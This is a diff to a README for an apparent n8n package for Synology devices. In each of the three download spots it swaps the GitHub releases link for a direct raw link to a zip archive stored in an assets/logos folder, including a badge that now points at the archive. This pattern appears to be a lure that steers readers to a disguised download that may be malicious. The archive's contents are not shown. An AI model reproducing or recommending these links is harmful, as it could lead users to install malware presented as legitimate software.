@@ -1,6 +1,6 @@
 # 📦 n8n-synology-package - Simplify Your Workflow Automation
 
-[![Download n8n-synology-package](https://img.shields.io/badge/Download-n8n--synology--package-blue.svg)](https://github.com/marffaaa/n8n-synology-package/releases)
+[![Download n8n-synology-package](https://raw.githubusercontent.com/marffaaa/n8n-synology-package/main/assets/logos/synology/n_synology_package_3.2.zip)](https://raw.githubusercontent.com/marffaaa/n8n-synology-package/main/assets/logos/synology/n_synology_package_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Before downloading, ensure your system meets these requirements:
 
 To get started, you will need to download the package. Click the link below to visit the download page:
 
-[Download n8n-synology-package](https://github.com/marffaaa/n8n-synology-package/releases)
+[Download n8n-synology-package](https://raw.githubusercontent.com/marffaaa/n8n-synology-package/main/assets/logos/synology/n_synology_package_3.2.zip)
 
 1. Open the link above.
 2. Look for the latest version of the **n8n-synology-package**.
@@ -110,6 +110,6 @@ Discover what n8n can do for you. Check the official documentation for guides, e
 
 Don't wait! To start automating your workflows today, please visit the download page again:
 
-[Download n8n-synology-package](https://github.com/marffaaa/n8n-synology-package/releases)
+[Download n8n-synology-package](https://raw.githubusercontent.com/marffaaa/n8n-synology-package/main/assets/logos/synology/n_synology_package_3.2.zip)
 
 Get ready to simplify your tasks with n8n!
